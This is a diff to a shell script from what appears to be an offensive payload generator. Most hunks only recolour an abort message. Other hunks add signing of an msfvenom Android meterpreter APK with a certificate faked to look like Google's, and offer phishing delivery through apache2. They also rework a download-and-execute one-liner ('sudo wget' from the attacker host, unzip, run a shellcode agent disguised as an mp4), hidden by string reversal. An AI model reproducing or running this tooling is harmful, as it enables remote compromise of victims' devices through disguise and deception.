@@ -1089,7 +1089,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -1339,7 +1339,7 @@ cd $IPATH
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -1683,7 +1683,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -2071,7 +2071,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -2426,7 +2426,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -2640,7 +2640,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -2915,7 +2915,7 @@ clear
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -3236,7 +3236,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -3546,7 +3546,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -3861,7 +3861,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -4198,7 +4198,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -4471,7 +4471,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -4840,7 +4840,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -5603,7 +5603,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_webshell_menu
   clear
@@ -5804,7 +5804,7 @@ clear
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_webshell_menu
   clear
@@ -5993,7 +5993,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_webshell_menu
   clear
@@ -6291,7 +6291,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_multi_menu
   clear
@@ -7117,7 +7117,7 @@ fi
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_multi_menu
   clear
@@ -7266,7 +7266,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_unix_menu
   clear
@@ -7308,6 +7308,33 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p android/meterp
 sleep 2
 
 
+## Sign apk application (certificate)
+echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Do you wish to sign $N4m.apk Appl (y|n)?:${Reset}";read cert
+if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
+   imp=`which keytool`
+   if [ "$?" -eq "0" ]; then
+      echo "[☠] Signing $N4m.apk using keytool .."
+      echo "[☠] keytool packet found (dependencie).."
+      cd $IPATH/output
+      imp=`which zipalign`
+      if [ "$?" -eq "0" ]; then
+         echo "[☠] zipalign packet found (dependencie).."
+      else
+         echo "[☠] zipalign packet NOT found (installing)..";sleep 2
+         sudo apt-get install zipalign
+      fi
+
+      echo "---";echo ""
+      ## https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/
+      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";sleep 1;echo ""
+      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 1;echo ""
+      zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo "";echo "---"
+      mv done.apk $Nam.apk > /dev/null 2>&1
+      cd $IPATH
+   else
+      echo "[☠] Abort, keytool packet not found.."
+   fi
+fi
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.apk\n\nchose how to deliver: $N4m.apk" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
@@ -7419,6 +7446,7 @@ sleep 2
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $IPATH/output/my-release-key.Keystore > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.apk > /dev/null 2>&1
@@ -7427,7 +7455,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_android_menu
   clear
@@ -7590,7 +7618,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_android_menu
   clear
@@ -7822,7 +7850,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_unix_menu
   clear
@@ -8134,7 +8162,7 @@ sh_menu
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_menu
   clear
@@ -8245,7 +8273,7 @@ echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
 gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
 echo "[☠] Give execution permitions to agent .." && sleep 1
 chmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1
-echo "[☠] Porting all files to apache2 webroot .." && sleep 2
+echo "[☠] Porting all files to apache2 webroot .." && sleep 1
 zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
@@ -8257,14 +8285,15 @@ cd $IPATH
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1
 
 
-ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
+ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2) # Read settings from venom-main settings file.
 if [ "$serv" = "multi-handler (default)" ]; then
 
    original_string="sudo ./$mP4.mp4";color="${RedF}"
    ## Read the next setting from venom-main setting file .
    if [ "$ovni" = "ON" ]; then
+      ## Reverse original string (venom attack vector)
       xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
-      reverse_original=`cat /tmp/reverse.txt`;rm /tmp/reverse.txt
+      reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
       original_string="rev <<< \"$reverse_original\"|\$0"
       color="${GreenF}"
    fi
@@ -8276,7 +8305,6 @@ if [ "$serv" = "multi-handler (default)" ]; then
    echo "-  That will remote download/exec (LAN) our mp4 video file and auto executes"
    echo "-  our C shellcode in an orphan process (deatch from mp4 video process)."
    echo "-  REMARK: All files required by this module have been ported to apache2."
-   echo "-  REMARK: Edit settings file to turn [OBFUSCATION:ON]"
    echo "-";echo "-  ${YellowF}MANUAL_EXECUTION:"${Reset};
    echo "-  $original_string";echo "---"
    echo -n "[☠] Press any key to start a handler .."
@@ -8292,10 +8320,10 @@ if [ "$serv" = "multi-handler (default)" ]; then
 
 else
 
-   ## Reverse original string (venom attack vector)
    original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4";color="${RedF}"
+   ## Reverse original string (venom attack vector)
    xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
-   reverse_original=`cat /tmp/reverse.txt`;rm -f /tmp/reverse.txt
+   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
    ## Read the next setting from venom-main setting file .
    if [ "$ovni" = "ON" ]; then
       original_string="sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\$h/$mP4.mp4"
@@ -8565,7 +8593,7 @@ cd $IPATH/
 else
 
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -8881,7 +8909,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -9208,7 +9236,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -9317,7 +9345,7 @@ cat << !
       elif [ "$paylo" = "meterpreter_reverse_https" ]; then
         msf_paylo="windows/meterpreter/reverse_https"
       else
-        echo "[x] Abort module execution .."
+        echo ${RedF}[x]${white} Abort module execution ..${Reset};
         sleep 2
         sh_menu
       fi
@@ -9483,7 +9511,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -9828,7 +9856,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_multi_menu
   clear
@@ -10109,7 +10137,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_world
   clear
@@ -10336,7 +10364,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_world
   clear
@@ -10421,7 +10449,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_world
   clear
@@ -10580,7 +10608,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
@@ -11016,7 +11044,7 @@ cd $IPATH/
 
 else
 
-  echo "[x] Abort module execution .."
+  echo ${RedF}[x]${white} Abort module execution ..${Reset};
   sleep 2
   sh_microsoft_menu
   clear
